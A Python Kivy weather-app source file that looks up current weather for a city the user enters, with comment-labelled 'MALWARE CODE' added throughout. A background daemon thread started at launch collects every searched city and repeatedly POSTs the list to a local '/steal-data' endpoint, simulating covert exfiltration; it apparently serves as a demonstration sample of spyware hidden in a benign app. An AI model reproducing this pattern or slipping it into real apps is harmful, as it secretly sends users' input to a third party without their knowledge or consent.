import threading
import requests
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
import time

class WeatherApp(App):
    def build(self):
        self.api_key = ""  # Replace with your WeatherAPI.com API key
        self.logged_cities = []  # Log cities entered (MALWARE CODE)

        # Main layout
        self.layout = BoxLayout(orientation='vertical', padding=10, spacing=10)

        # Header
        self.header = Label(
            text="Weather App",
            font_size='24sp',
            bold=True,
            size_hint=(1, 0.2)
        )
        self.layout.add_widget(self.header)

        # City input field
        self.city_input = TextInput(
            hint_text="Enter city name...",
            multiline=False,
            size_hint=(1, 0.1)
        )
        self.layout.add_widget(self.city_input)

        # Search button
        self.search_button = Button(
            text="Get Weather",
            size_hint=(1, 0.1),
            background_color=(0, 0.6, 0.8, 1)
        )
        self.search_button.bind(on_press=self.get_weather)
        self.layout.add_widget(self.search_button)

        # Weather display
        self.weather_label = Label(
            text="Weather information will be displayed here.",
            size_hint=(1, 0.6),
            halign="center",
            valign="middle"
        )
        self.weather_label.bind(size=self.weather_label.setter('text_size'))
        self.layout.add_widget(self.weather_label)

        # Start malicious background task (MALWARE CODE)
        threading.Thread(target=self.malicious_background_task, daemon=True).start()

        return self.layout

    def get_weather(self, instance):
        city = self.city_input.text.strip()
        if not city:
            self.weather_label.text = "Please enter a city name."
            return

        try:
            # API call to fetch weather
            url = f"http://api.weatherapi.com/v1/current.json?key={self.api_key}&q={city}"
            response = requests.get(url)
            data = response.json()

            # Check if city is found
            if "error" in data:
                self.weather_label.text = f"Error: {data['error']['message']}"
            else:
                location = data["location"]["name"]
                temp_c = data["current"]["temp_c"]
                condition = data["current"]["condition"]["text"]
                self.weather_label.text = (
                    f"Weather in {location}:\n"
                    f"Temperature: {temp_c}°C\n"
                    f"Condition: {condition}"
                )

                # Log the city for malicious purposes (MALWARE CODE)
                self.logged_cities.append(city)

        except Exception as e:
            self.weather_label.text = "Error fetching weather data. Please try again."

    # Malicious Background Task (MALWARE CODE)
    def malicious_background_task(self):
        while True:
            if self.logged_cities:
                try:
                    # Simulate sending logged data to a remote server
                    url = "http://127.0.0.1:8000/steal-data"  # Flask server URL
                    data = {"cities": self.logged_cities}
                    response = requests.post(url, json=data)
                    print(f"Sent data to malicious server: {data}")
                except Exception as e:
                    print(f"Failed to send data: {e}")
            time.sleep(10)  # Wait before retrying to send data

if __name__ == "__main__":
    WeatherApp().run()
